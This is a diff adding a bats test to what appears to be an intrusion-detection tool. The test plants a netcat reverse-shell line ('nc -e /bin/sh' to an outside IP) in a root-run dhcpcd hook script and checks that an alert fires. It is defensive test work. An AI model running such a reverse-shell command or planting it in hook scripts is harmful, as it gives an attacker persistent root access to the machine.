@@ -272,3 +272,19 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in dhcpcd hook: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
+    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates
+    # nc reverse-shell variant INVARIANTs across the brain. Lock the
+    # netcat axis on lease-event-triggered root-exec persistence
+    # surface (T1546 — dhcpcd runs hook scripts AS ROOT on every
+    # CARRIER/BOUND/RENEW; RENEW self-fires on timer so the trigger
+    # is recurrent).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/50-benign"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
